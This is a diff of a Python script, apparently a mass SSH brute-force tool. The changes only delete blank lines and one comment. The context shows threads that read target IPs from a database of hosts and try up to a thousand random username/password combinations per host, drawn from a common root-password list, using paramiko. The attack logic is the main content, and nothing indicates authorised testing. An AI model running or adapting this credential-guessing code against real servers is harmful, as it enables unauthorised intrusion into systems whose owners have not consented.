@@ -46,7 +46,6 @@ class SSHConnectionThread(threading.Thread):
             if ip_address is None:
                 # Signal to stop the thread
                 break
-
             try:
                 for _ in range(1000):
                     username = random.choice(self.usernames)
@@ -56,7 +55,6 @@ class SSHConnectionThread(threading.Thread):
                         try:
                             client = paramiko.SSHClient()
                             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
                             print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
 
                             try:
@@ -82,22 +80,16 @@ class SSHConnectionThread(threading.Thread):
                                 continue
                             finally:
                                 client.close()
-
                             break
-
                         except Exception as e:
                             print(f"{RED}Error occurred: {RESET}{str(e)}")
                             traceback.print_exc()
                             break
-
                     if retries >= MAX_RETRIES:
                         print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
-
             except Exception as e:
                 print(f"{RED}Error occurred while processing {ip_address}: {str(e)}")
-
             self.queue.task_done()
-
 
 def main(username_file, password_file):
     # Fetch the IP addresses from the database
@@ -105,7 +97,6 @@ def main(username_file, password_file):
     cur.execute("SELECT ip_address FROM hosts WHERE ip_address IS NOT NULL")
     ip_addresses = [row[0] for row in cur.fetchall()]
     
-
     # Create a queue to hold the IP addresses
     queue = Queue()
     for ip_address in ip_addresses:
@@ -127,8 +118,6 @@ def main(username_file, password_file):
     for thread in threads:
         thread.join()
 
-
-# Example usage
 username_file = "usernames.txt"
 password_file = "common_root_passwords.txt"
 main(username_file, password_file)
